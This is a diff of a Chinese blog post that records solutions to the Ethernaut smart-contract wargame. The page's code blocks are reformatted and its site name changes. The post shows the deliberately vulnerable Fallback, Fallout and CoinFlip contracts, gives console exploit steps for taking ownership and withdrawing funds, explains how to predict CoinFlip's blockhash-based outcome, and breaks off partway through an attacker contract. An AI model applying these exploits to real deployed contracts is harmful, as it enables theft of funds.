@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Ethernaut记录, Jlan&#39;s Little World">
+    <meta name="keywords" content="Ethernaut记录, J1an&#39;s Little World">
     <meta name="description" content="Fallback首先看通关方式
 
 仔细看下面的合约代码.
@@ -29,7 +29,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Ethernaut记录 | Jlan&#39;s Little World</title>
+    <title>Ethernaut记录 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -57,8 +57,6 @@
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -76,7 +74,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -97,55 +95,11 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -180,7 +134,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -203,55 +157,11 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -403,6 +313,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -425,7 +338,42 @@
 </ul>
 </blockquote>
 <p>再看代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line">contract Fallback &#123;</span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span>
+<span class="token keyword">contract</span> <span class="token class-name">Fallback</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>
+  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> contributions<span class="token punctuation">;</span>
+  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
+  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+    contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">modifier</span> onlyOwner <span class="token punctuation">&#123;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>
+            msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span>
+            <span class="token string">"caller is not the owner"</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">_</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token keyword">function</span> <span class="token function">contribute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> <span class="token number">0.001</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> contributions<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">function</span> <span class="token function">getContribution</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>
+    owner<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>逐步分析，在合约的构造函数中将合约的部署者设置成了函数的owner并且设定了其贡献值为1000eth，如果走contribute函数来获取owner权限的话需要超过1000eth的贡献，而每次的贡献又需要小于0.001eth，这显然是不现实的，所以我们看向receive函数，在这里只要我们向receive函数携带eth，并且我们有贡献值就能拿到owner权限，最后再使用withdraw将合约剩余代币转出即可</p>
 <ul>
@@ -433,13 +381,57 @@
 <li>contract.sendTransaction({value:1})</li>
 <li>contract.withdraw()</li>
 </ul>
-<h2 id="FallOut"><a href="#FallOut" class="headerlink" title="FallOut"></a>FallOut</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="FallOut"><a href="#FallOut" class="headerlink" title="FallOut"></a>FallOut</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">Fallout</span> <span class="token punctuation">&#123;</span>
+  
+  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>
+  <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> allocations<span class="token punctuation">;</span>
+  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
+  <span class="token comment">/* constructor */</span>
+  <span class="token keyword">function</span> <span class="token function">Fal1out</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+    allocations<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">modifier</span> onlyOwner <span class="token punctuation">&#123;</span>
+	        <span class="token keyword">require</span><span class="token punctuation">(</span>
+	            msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span>
+	            <span class="token string">"caller is not the owner"</span>
+	        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+	        <span class="token keyword">_</span><span class="token punctuation">;</span>
+	    <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">allocate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+    allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">sendAllocation</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">require</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    allocator<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">collectAllocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>
+    msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">allocatorBalance</span><span class="token punctuation">(</span><span class="token builtin">address</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p>这很白痴是吧? 真实世界的合约必须安全的多, 难以入侵的多, 对吧?</p>
 <p>实际上… 也未必.</p>
 <p>Rubixi的故事在以太坊生态中非常知名. 这个公司把名字从 ‘Dynamic Pyramid’ 改成 ‘Rubixi’ 但是不知道怎么地, 他们没有把合约的 constructor 方法也一起更名:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Rubixi &#123;</span><br><span class="line">  address private owner;</span><br><span class="line">  function DynamicPyramid() &#123; owner = msg.sender; &#125;</span><br><span class="line">  function collectAllFees() &#123; owner.transfer(this.balance) &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">contract Rubixi &#123;
+  address private owner;
+  function DynamicPyramid() &#123; owner &#x3D; msg.sender; &#125;
+  function collectAllFees() &#123; owner.transfer(this.balance) &#125;
+  ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这让攻击者可以调用旧合约的constructor 然后获得合约的控制权, 然后再获得一些资产. 是的. 这些重大错误在智能合约的世界是有可能的.</p>
 </blockquote>
@@ -451,12 +443,85 @@
 <li>查看上面的帮助页面，“控制台之外” 部分</li>
 </ul>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();//回滚</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">&#123;</span>
+
+  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>
+  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>
+  <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>
+  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//回滚</span>
+    <span class="token punctuation">&#125;</span>
+
+    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>
+    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue<span class="token punctuation">.</span><span class="token function">div</span><span class="token punctuation">(</span>FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>看代码定义的三个数字consecutiveWins，lastHash，FACTOR，分别是我们获胜的次数，最后一次区块的哈希，还有2的255次方</p>
 <p>再看后面整个对硬币反转做判断的函数内容，首先是让blockValue值为前一个区块，并且进行判断如果此次猜测和上次猜测的区块相同就回滚整个过程，如果不是就继续下面内容</p>
 <p>首先将此次的区块内容存储，并且让coinFilp的值为blockValue/FACTOR，此处由于自动取整，并且FACTOR值为2^255，所以结果非1即0，可以看到整个过程随机结果的产生完全依靠于上一个区块，所以我们只需要先本地执行一遍算法计算出coinFlip的值就能保证我们每次都“猜”到结果，区块大约为10秒一个，所以直接使用手撸复制猜测是不现实，我们可以再写一个合约部署到相同的区块链上来攻击该链</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue/FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 